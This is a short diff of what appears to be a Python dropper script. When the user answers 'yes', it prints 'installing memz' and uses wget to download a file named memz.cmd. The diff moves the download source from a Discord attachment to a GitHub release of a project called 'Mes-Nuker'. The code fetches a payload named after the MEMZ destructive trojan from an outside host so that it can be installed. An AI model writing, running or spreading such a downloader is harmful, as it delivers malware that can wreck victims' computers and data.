@@ -9,11 +9,11 @@ if user_input.lower() == 'yes':
     time.sleep(2.0)
     print("installing memz")
 
-    bat_url = "https://cdn.discordapp.com/attachments/1066380188750991533/1069963515617624204/memz.cmd"
+    memz_url = "https://github.com/prorockz901/Mes-Nuker/releases/download/v1.1/memz.cmd"
 
-    bat = wget.download(bat_url) #downloads first file from url
-    print(bat)
-    
+    memz = wget.download(memz_url) #downloads first file from url
+    print(memz)
+
     print("Downloaded 1 file")
 
     time.sleep(2.0)
